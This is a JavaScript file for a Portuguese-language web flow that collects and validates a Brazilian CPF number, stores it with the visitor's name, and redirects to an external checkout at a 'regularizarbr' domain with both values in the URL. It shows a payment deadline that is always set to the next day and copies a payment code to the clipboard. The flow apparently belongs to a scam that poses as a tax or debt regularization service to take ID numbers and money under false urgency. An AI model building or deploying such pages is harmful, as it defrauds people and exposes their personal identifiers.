window.onload = () => {
  main();
  addRegularizarListener();
  addGerarPagamentoListener();
  addCopiarCodigo();
  addData()
};

function addData() {
  document.querySelector(".date").innerText = getCurrentDatePlusOneDayFormatted()
}

function main() {
  const cpfInput = document.querySelector("#cpf-input");
  const continuarButton = document.querySelector("button");

  continuarButton.addEventListener("click", (event) => {
    event.preventDefault(); // Prevent form submission
    if (cpfInput) {
      const cpfValue = cpfInput.value;
      const cpfErrorMessage = document.createElement("p");
      cpfErrorMessage.style.color = "red";
      cpfErrorMessage.className = "cpf-error-message text-xs text-center"; // for easy removal

      const cpfPattern = /^\d{3}\.\d{3}\.\d{3}-\d{2}$/;

      const existingError = document.querySelector(".cpf-error-message");
      if (existingError) existingError.remove();

      if (!cpfValue) {
        cpfErrorMessage.textContent = "CPF deve ser informado.";
        cpfInput.parentElement.appendChild(cpfErrorMessage);
      } else if (!cpfPattern.test(cpfValue)) {
        cpfErrorMessage.textContent =
          "CPF inválido. Formato esperado: 000.000.000-00.";
        cpfInput.parentElement.appendChild(cpfErrorMessage);
      } else {
        localStorage.setItem('cpf', cpfValue.replace(/\D/g, ""));
        console.log("CPF Value:", cpfValue);
        window.location.href = "regularize.html";
      }
    }
      
  });
}

function addRegularizarListener() {
  const regularizarButton = document.querySelector("#regularize");

  if (regularizarButton) {
    regularizarButton.addEventListener("click", () => {
      window.location.href = "pagamento.html";
    });
  }
}

function addGerarPagamentoListener() {
  const gerarPagamentoButton = document.querySelector("#gerar-pagamento");

  if (gerarPagamentoButton) {
    gerarPagamentoButton.addEventListener("click", () => {
      
      const cpf = localStorage.getItem('cpf') ? localStorage.getItem('cpf').replace(/[^\d]/g, '') : '';
      
      
      const nome = localStorage.getItem('name') ? localStorage.getItem('name') : '';

      if (nome) {
       
        const encodedName = encodeURIComponent(nome);
        
        
        const checkoutURL = `https://pay.regularizarbr.online/KV603kPQyDdZw8y/?name=${encodedName}&document=${cpf}`;
        
        window.location.href = checkoutURL;
      }
    });
  }
}



function addCopiarCodigo() {
    const copiarCodigoButton = document.querySelector("#copiar-codigo");
    const codigoInput = document.querySelector("#codigo-input");

    if (copiarCodigoButton && codigoInput) {
        copiarCodigoButton.addEventListener("click", () => {
            // Copy the value from the input to the clipboard
            navigator.clipboard
                .writeText(codigoInput.value)
                .then(() => {
                    // Display an alert to confirm the code was copied
                    // alert("Código copiado para a área de transferência!");
                    Toastify({
                      text: `Código copiado para a área de transferência!`,
                      className: "sucess",
                      duration: 3000,
                      style: {
                        background: "linear-gradient(to right, #00b09b, #96c93d)",
                      }
                    }).showToast();

                    // Change button text to "Código copiado"
                    copiarCodigoButton.textContent = "Código copiado";

                    // Update the button's style to indicate success
                    copiarCodigoButton.classList.remove("text-blue-600", "border-blue-500");
                    copiarCodigoButton.classList.add("text-green-600", "border-green-500");
                })
                .catch((err) => {
                    console.error("Failed to copy: ", err);
                });
        });
    }
}


function handleCPFInput(event) {
    const cpf = event.target.value.replace(/\D/g, '');

    if (cpf.length >= 4) {
      event.target.value = cpf.slice(0, 3) + '.' + cpf.slice(3);
    }

    if (cpf.length >= 7) {
      event.target.value = cpf.slice(0, 3) + '.' + cpf.slice(3, 6) + '.' + cpf.slice(6);
    }

    if (cpf.length >= 10) {
      event.target.value = cpf.slice(0, 3) + '.' + cpf.slice(3, 6) + '.' + cpf.slice(6, 9) + '-' + cpf.slice(9);
    }

    const errorMsg = document.querySelector('.cpf-error-message');
    if (cpf.length === 11) {
      if (isValidCPF(cpf)) {
        errorMsg.style.display = 'none';
      } else {
        errorMsg.style.color = "red";
        errorMsg.style.display = 'block';
        errorMsg.textContent = 'Digite um CPF válido';
      }
    } else {
      errorMsg.textContent = '';
    }
}

function isValidCPF(cpf) {
  if (typeof cpf !== "string") return false;
  cpf = cpf.replace(/\D/g, "");
  if (cpf.length !== 11 || /^(\d)\1{10}$/.test(cpf)) return false;

  let sum = 0;
  let remainder;
  for (let i = 1; i <= 9; i++) {
    sum += parseInt(cpf.substring(i - 1, i)) * (11 - i);
  }
  remainder = (sum * 10) % 11;

  if (remainder === 10 || remainder === 11) remainder = 0;
  if (remainder !== parseInt(cpf.substring(9, 10))) return false;

  sum = 0;
  for (let i = 1; i <= 10; i++) {
    sum += parseInt(cpf.substring(i - 1, i)) * (12 - i);
  }
  remainder = (sum * 10) % 11;

  if (remainder === 10 || remainder === 11) remainder = 0;
  if (remainder !== parseInt(cpf.substring(10, 11))) return false;

  return true;
}

function formatCPF(cpf) {
  // Remove qualquer caractere que não seja número
  cpf = cpf.replace(/\D/g, '');

  // Adiciona os pontos e o hífen na posição correta
  return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
}

function getCurrentDatePlusOneDayFormatted() {
  const currentDate = new Date();
  currentDate.setDate(currentDate.getDate() + 1); // Adiciona 1 dia

  const day = String(currentDate.getDate()).padStart(2, '0');
  const month = String(currentDate.getMonth() + 1).padStart(2, '0'); // Meses começam em 0
  const year = currentDate.getFullYear();

  return `${day}/${month}/${year}`;
}